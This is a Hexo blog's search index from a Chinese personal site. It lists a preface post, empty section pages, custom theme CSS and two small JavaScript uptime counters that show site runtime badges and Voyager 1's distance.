      <url>/2023/08/25/2023-8-25-%E5%BA%8F%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2>]]></content>
      
      
      <categories>
          
          <category> 序言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第七篇文章</title>
      <link href="/2023/08/18/2023-8-18-%E7%AC%AC%E4%B8%83%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2023/08/18/2023-8-18-%E7%AC%AC%E4%B8%83%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }  /* 小冰分类分类磁铁黑夜模式适配 */  /* 一般状态 */  [data-theme="dark"] .magnet_link_context {      background: #1e1e1e;      color: antiquewhite;  }  /* 鼠标悬浮状态 */  [data-theme="dark"] .magnet_link_context:hover {      background: #3ecdf1;      color: #f2f2f2;  }  /* 翻页按钮居中 */  #pagination {    width: 100%;    margin: auto;   }     /* 日间模式不生效 */     [data-theme="light"] #site-name,     [data-theme="light"] #site-title,     [data-theme="light"] #site-subtitle,     [data-theme="light"] #post-info {       animation: none;     }       /* 夜间模式生效 */     [data-theme="dark"] #site-name,     [data-theme="dark"] #site-title {       animation: light_15px 10s linear infinite;     }       [data-theme="dark"] #site-subtitle {       animation: light_10px 10s linear infinite;     }       [data-theme="dark"] #post-info {       animation: light_5px 10s linear infinite;     }       /* 关键帧描述 */     @keyframes light_15px {       0% {         text-shadow: #5636ed 0 0 15px;       }         12.5% {         text-shadow: #11ee5e 0 0 15px;       }         25% {         text-shadow: #f14747 0 0 15px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 15px;       }         50% {         text-shadow: #b347f1 0 0 15px;       }         62.5% {         text-shadow: #002afa 0 0 15px;       }         75% {         text-shadow: #ed709b 0 0 15px;       }         87.5% {         text-shadow: #39c5bb 0 0 15px;       }         100% {         text-shadow: #5636ed 0 0 15px;       }     }       @keyframes light_10px {       0% {         text-shadow: #5636ed 0 0 10px;       }         12.5% {         text-shadow: #11ee5e 0 0 10px;       }         25% {         text-shadow: #f14747 0 0 10px;       }         37.5% {         text-shadow: #f1a247 0 0 10px;       }         50% {         text-shadow: #f1ee47 0 0 10px;       }         50% {         text-shadow: #b347f1 0 0 10px;       }         62.5% {         text-shadow: #002afa 0 0 10px;       }         75% {         text-shadow: #ed709b 0 0 10px;       }         87.5% {         text-shadow: #39c5bb 0 0 10px;       }         100% {         text-shadow: #5636ed 0 0 10px;       }     }       @keyframes light_5px {       0% {         text-shadow: #5636ed 0 0 5px;       }         12.5% {         text-shadow: #11ee5e 0 0 5px;       }         25% {         text-shadow: #f14747 0 0 5px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 5px;       }         50% {         text-shadow: #b347f1 0 0 5px;       }         62.5% {         text-shadow: #002afa 0 0 5px;       }         75% {         text-shadow: #ed709b 0 0 5px;       }         87.5% {         text-shadow: #39c5bb 0 0 5px;       }         100% {         text-shadow: #5636ed 0 0 5px;       }     }         /* 侧边栏个人信息卡片动态渐变色 */         #aside-content>.card-widget.card-info {           background: linear-gradient(-45deg,               #e8d8b9,               #eccec5,               #a3e9eb,               #bdbdf0,               #eec1ea);           box-shadow: 0 0 5px rgb(66, 68, 68);           position: relative;           background-size: 400% 400%;           -webkit-animation: Gradient 10s ease infinite;           -moz-animation: Gradient 10s ease infinite;           animation: Gradient 10s ease infinite !important;         }             @-webkit-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @-moz-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             /* 黑夜模式适配 */         [data-theme="dark"] #aside-content>.card-widget.card-info {           background: #191919ee;         }             /* 个人信息Follow me按钮 */         #aside-content>.card-widget.card-info>#card-info-btn {           background-color: #3eb8be;           border-radius: 8px;         }/* 首页文章卡片 */#recent-posts>.recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts>.recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/lib_runtime.js"/>
      <url>/js/lib_runtime.js</url>
      
        <content type="html"><![CDATA[setInterval(() => {  let create_time = Math.round(new Date('2023-8-19 13:34:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (Number(time[2])>7)){    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-营业中-6adea8?style=social&logo=cakephp' title='距离第十八层还有不少距离哦'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-打烊了-6adea8?style=social&logo=coffeescript' title='这里的人也是要休息的QWQ'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<!-- GitCalendar容器 --><div id="gitZone"> </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { now.setTime(now.getTime() + 1e3); var e = new Date("08/01/2022 00:00:00"), t = Math.trunc(234e8 + (now - e) / 1e3 * 17), a = (t / 1496e5).toFixed(6), o = new Date("08/09/2022 00:00:00"), n = (now - o) / 1e3 / 60 / 60 / 24, r = Math.floor(n), i = (now - o) / 1e3 / 60 / 60 - 24 * r, s = Math.floor(i); 1 == String(s).length && (s = "0" + s); var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s, l = Math.floor(d); 1 == String(l).length && (l = "0" + l); var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l, b = Math.round(g); 1 == String(b).length && (b = "0" + b); let c = ""; c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg' title='什么时候能够实现财富自由呀~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg' title='下班了就该开开心心地玩耍~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标题</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
